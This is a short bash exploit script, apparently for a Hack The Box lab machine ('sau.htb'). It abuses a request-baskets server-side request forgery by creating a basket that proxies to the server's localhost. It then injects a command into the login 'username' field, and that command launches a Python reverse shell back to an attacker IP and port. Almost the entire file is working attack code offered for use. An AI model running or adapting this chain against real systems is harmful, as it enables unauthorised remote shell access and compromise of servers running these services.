#!/bin/bash
vulnerable="http://sau.htb:55555"; #requests-buckets site
api_path="/api/baskets/"; #api path
target="http://localhost"; #target from the vulnerable site's point of view (localhost here indicates localhost on vulnerable server)
basket=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

vulnerablebasket="$vulnerable$api_path$basket";
body="{\"forward_url\": \"$target\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

echo "Creating vulnerable basket...";

curl -s -X POST -H 'Content-Type: application/json' -d "$body" "$vulnerablebasket"; #post request to create basket with params
echo "";
echo "Access gained via: $vulnerable/$basket"; #link to proxied website

echo "";
echo "Hope you have nc open.. SHELL INCOMING!";
attackerIP="10.10.14.122";
attackerPort=4444;
shellcode='curl "http://'"$attackerIP"':8000/?d=$(/usr/bin/python3+-c+'\''a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("'"$attackerIP"'",'"$attackerPort"'));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'\'')"'
echo 'username=;`'"$shellcode"'`'
curl "$vulnerable/$basket/login" --data 'username=;`'"$shellcode"'`#'